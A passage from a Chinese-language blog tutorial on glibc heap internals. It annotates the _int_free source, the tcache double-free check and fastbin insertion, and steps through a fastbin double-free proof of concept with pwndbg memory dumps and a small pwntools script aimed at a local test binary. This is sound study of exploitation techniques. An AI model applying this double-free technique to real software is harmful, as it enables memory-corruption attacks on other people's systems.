class="line"><span class="number">0x5555557573b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>牵扯到的_int_free 源码如下：</p><blockquote><p>这里以第一个 free 为例子进行说明，由于之前在 malloc 章节中已经详细说过部分代码，因此在如下的内容中重复的内容会省略或简略说明。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;<span class="comment">//p是要free的堆块的指针</span></span><br><span class="line"><span class="comment">//......（一些变量的定义省略）</span></span><br><span class="line"><span class="comment">//p= (mchunkptr) 0x555555757250</span></span><br><span class="line">  size = chunksize (p);  <span class="comment">//size==0x20</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>); <span class="comment">//检查p指针是否有效</span></span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line">    <span class="comment">//检查p的大小是否有效:</span></span><br><span class="line">    <span class="comment">//1、堆块的大小不能小于最小分配大小</span></span><br><span class="line">    <span class="comment">//2、堆块的必须是MALLOC_ALIGN_MASK（堆块大小的最小对齐单位）的整数倍</span></span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size); <span class="comment">//tc_idx==0</span></span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;<span class="comment">//要求tcachebin已经初始化并且p在tcachebin链表范围内</span></span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);<span class="comment">//将堆块起始地址转化为指向user_data</span></span><br><span class="line"><span class="comment">//p==0x555555757250;e==0x555555757260</span></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache)) <span class="comment">//检查p的key标志位</span></span><br><span class="line">  &#123;<span class="comment">//if语句中的内容会检查是否发生了double free</span></span><br><span class="line">       <span class="comment">//如果p的key标志位已经设置，我们有理由怀疑发生了double free，接下来要证明这一点</span></span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; <span class="comment">//获取tcachebin中的最后一个进入的free chunk</span></span><br><span class="line"> tmp;<span class="comment">//判断循环终止条件：tmp堆块是否为NULL</span></span><br><span class="line"> tmp = tmp-&gt;next) <span class="comment">//获取tmp的next指针，也就是下一个chunk</span></span><br><span class="line">      <span class="keyword">if</span> (tmp == e) <span class="comment">//如果bin中有两个相同的chunk，则说明发生了double free</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>); <span class="comment">//触发异常</span></span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//现在此堆块正常，我们要将其放入到对应的tcachebin中</span></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>上面的源码中有一部分很有意思：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache)) <span class="comment">//检查p的key标志位</span></span><br><span class="line">  &#123;<span class="comment">//if语句中的内容会检查是否发生了double free</span></span><br><span class="line">      <span class="comment">//如果p的key标志位已经设置，我们有理由怀疑发生了double free，接下来要证明这一点</span></span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; <span class="comment">//获取tcachebin中的最后一个进入的free chunk</span></span><br><span class="line"> tmp;<span class="comment">//判断循环终止条件：tmp堆块是否为NULL</span></span><br><span class="line"> tmp = tmp-&gt;next) <span class="comment">//获取tmp的next指针，也就是下一个chunk</span></span><br><span class="line">      <span class="keyword">if</span> (tmp == e) <span class="comment">//如果bin中有两个相同的chunk，则说明发生了double free</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>); <span class="comment">//触发异常</span></span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>进入此 if 语句我们需要 e-&gt;key==tcache，当进入此 if 语句时我们可以怀疑 p 这个堆块发生了 double free，但是现在不是很确定，因为在释放前堆块的 user data 中的是有内容的，也就是说 p 的 key 标志位处很可能有数据，假如说这个数据恰好是 tcache_perthread_struct+0x10（tcache）呢：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">read(<span class="number">0</span>,p,<span class="number">0x20</span>);<span class="comment">//0x0000555555756010</span></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>编辑命令：gcc -g test -o test（调试时关闭 ALSR）</p></blockquote><p>为了方便交互，我还写了一个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b 9&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x0000555555756010</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行此脚本后我们 finish 后直接跳到断点处，然后引入 malloc 源码进入 free 开始调试：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618880477587-f35d04ae-2ed4-4e0e-ad65-a322d5d429e5.png#clientId=ub72fb564-79e2-4&from=drop&id=u78ff4cd6&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-20%2009.01.13.png&originHeight=1066&originWidth=2748&originalType=binary&size=213489&status=done&style=none&taskId=ufe3305bb-d3c5-4b07-a9b3-bd7b9d9e371" alt="截屏2021-04-20 09.01.13.png"><br>现在进入了 if 语句，但是是否发生了 double free 还需要 if 语句中的 for 循环来确定：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; //获取tcachebin中的最后一个进入的free chunk</span><br><span class="line"> tmp;//判断循环终止条件：tmp堆块是否为NULL</span><br><span class="line"> tmp = tmp-&gt;<span class="built_in">next</span>) //获取tmp的<span class="built_in">next</span>指针，也就是下一个chunk</span><br><span class="line">     <span class="keyword">if</span> (tmp == e) //如果<span class="built_in">bin</span>中有两个相同的chunk，则说明发生了double free</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>); //触发异常</span><br></pre></td></tr></table></figure><p>在这个 for 循环中会对对应大小的 tcachebin 进行遍历，要触发异常我们的 chunk 必须在 tcachebin 中，这也就避免来堆块中的用户数据影响堆块的释放过程：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618880892332-827db2eb-b12d-4d83-9af3-25ce4fdb3928.png#clientId=ub72fb564-79e2-4&from=drop&id=u08a9b81a&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-20%2009.08.08.png&originHeight=1800&originWidth=2880&originalType=binary&size=422104&status=done&style=none&taskId=u820b4c6e-2ddd-46de-aef8-9b59d21ac75" alt="截屏2021-04-20 09.08.08.png"><br>额，扯的好像有点远了，我们继续来看 POC：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><blockquote><p>calloc(1, 8)：在堆中分配 1 个长度为 8 的连续空间<br>calloc 申请堆块不会向 tcachebin 中申请堆块，具体原因可以看之前 malloc 文章或 malloc 源码</p></blockquote><p>结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618881585474-a155debb-0127-4e6d-bbd4-75b4c765137d.png#clientId=ub72fb564-79e2-4&from=drop&id=ufba254be&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-20%2009.19.42.png&originHeight=674&originWidth=2750&originalType=binary&size=83693&status=done&style=none&taskId=u5601a015-11fb-47a4-8c89-b9dc7ac455f" alt="截屏2021-04-20 09.19.42.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">120</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000007</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757050</span>:<span class="number">0x0000555555757320</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index1(tcachebin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index2(tcachebin)</span><br><span class="line"><span class="number">0x555555757280</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index3(tcachebin)</span><br><span class="line"><span class="number">0x5555557572a0</span>:<span class="number">0x0000555555757280</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index4(tcachebin)</span><br><span class="line"><span class="number">0x5555557572c0</span>:<span class="number">0x00005555557572a0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index5(tcachebin)</span><br><span class="line"><span class="number">0x5555557572e0</span>:<span class="number">0x00005555557572c0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index6(tcachebin)</span><br><span class="line"><span class="number">0x555555757300</span>:<span class="number">0x00005555557572e0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index7(tcachebin)</span><br><span class="line"><span class="number">0x555555757320</span>:<span class="number">0x0000555555757300</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index8(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index9(<span class="built_in">calloc</span>)</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index10(<span class="built_in">calloc</span>)</span><br><span class="line"><span class="number">0x555555757380</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757390</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index11(<span class="built_in">calloc</span>)</span><br><span class="line"><span class="number">0x5555557573a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557573b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020c51</span> #top_chunk</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们会将申请的 index9、index10 依次按顺序释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b); <span class="comment">//避免触发异常：fastbin double free</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><blockquote><p>个人猜测：为什么不在 fastbin 对 double free 进行和 tcache 一样的检查机制？<br>在 tcachebin 中每一条链上都有且最多有 7 个 free chunk，在对相应的链表进行检查时 free chunk 的堆块数目较少，基本上不会拖慢程序的运行速度；而 fastbin 就不一样了，其每条链表上的堆块数目没有限制，若链上的 chunk 过多并且依照 tcachebin 增加类似的检查机制，在 for 循环中会极大的降低程序的运行效率。</p></blockquote><p>其中堆块进入 fastbin 的过程源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span> <span class="comment">//如果符合条件，为了在malloc时迅速找到符合条件的堆块，我们会将其放入到fastbin中</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ()) <span class="comment">//global_max_fast()==0x80</span></span><br><span class="line"><span class="comment">//判断chunk是否可以放入fastbin中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">//TRIM_FASTBINS默认值为0：当某个chunk与top_chunk相邻，</span></span><br><span class="line">      <span class="comment">//在free此堆块时选择是否进入fastbin，为0时不会和top_chunk合并而进入fastbin</span></span><br><span class="line">      <span class="comment">//为1时会与top_chunk合并。</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) <span class="comment">//判断下一个chunk是否为top_chunk</span></span><br><span class="line">      <span class="comment">//上面这个判断条件在TRIM_FASTBINS==0时是没有意义的</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"><span class="comment">//接下来开始检查与chunk相邻的下一个chunk大小是否很离谱</span></span><br><span class="line">    <span class="comment">//（为了叙述方便这里我们称之为nextchunk）</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;<span class="comment">//nextsize&lt;=2 * SIZE_SZ或nextsize&gt;=system_mem(详细内容请见之前的malloc文章)</span></span><br><span class="line"><span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock) <span class="comment">//有关多线程，这里不过多说明</span></span><br><span class="line">  &#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail) <span class="comment">//nextsize大小异常，触发malloc_printerr</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">      <span class="comment">//chunk2mem(p)指向user_data，</span></span><br><span class="line">      <span class="comment">//free_perturb函数的作用是将user_data填充为perturb_byte(也就是0)</span></span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">      <span class="comment">//将av-&gt;have_fastchunks设置为true（1）</span></span><br><span class="line">      <span class="comment">//av-&gt;have_fastchunks表示fastbin中是否有free chunk，其值只有1和0</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size); <span class="comment">//获取fastbin index</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);<span class="comment">//获取main_arena指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2; <span class="comment">//old指向此时链表中最后插入fastbin的地址</span></span><br><span class="line">         <span class="comment">//当第一次向fastbin插入堆块时*old==NULL</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">//我们只看单线程</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>)) <span class="comment">//检查fastbin double free的代码，易绕过</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">    <span class="comment">//以下两条代码是插入fastbin的核心过程</span></span><br><span class="line">p-&gt;fd = old;  <span class="comment">//将p的fd设置为old（插入fastbin链表）</span></span><br><span class="line">*fb = p; <span class="comment">//设置main_arena中的地址为p（设置fastbinY[idx] entry）</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="comment">//......（多线程内容省略）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> <span class="comment">//单线程默认have_lock==0</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>)) <span class="comment">//多线程检查fastbin old chunk大小是否正常</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>); <span class="comment">//单线程会在malloc此堆块时进行检查。</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>总结：在释放 free 时优先级(堆块大小小于 0x80)：tcachebin&gt;fastbin&gt;与 top_chunk 合并</strong> &gt; <strong>（其实这里压根没有 top_chunk 的事，因为 fastbin 链表上的 chunk 可以是无限的）</strong></p></blockquote><p>回到程序中，free 掉三个堆块后的情况如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618890937427-22c0aa57-127c-47bc-b941-25fc62ab73f9.png#clientId=ub72fb564-79e2-4&from=drop&id=uf79153fb&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-20%2011.55.33.png&originHeight=336&originWidth=1852&originalType=binary&size=48400&status=done&style=none&taskId=uc05c8d3a-64f3-4c42-89a4-69e3f02a5f4" alt="截屏2021-04-20 11.55.33.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618891052682-44b46340-ebe7-439e-bc93-10292333c629.png#clientId=ub72fb564-79e2-4&from=drop&id=u5bf3792c&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-20%2011.57.26.png&originHeight=893&originWidth=1855&originalType=binary&size=278813&status=done&style=none&taskId=ueec3a00e-ed1a-4d52-b075-5bfbd1a441b" alt="截屏2021-04-20 11.57.26.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">120</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000007</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757050</span>:<span class="number">0x0000555555757320</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span 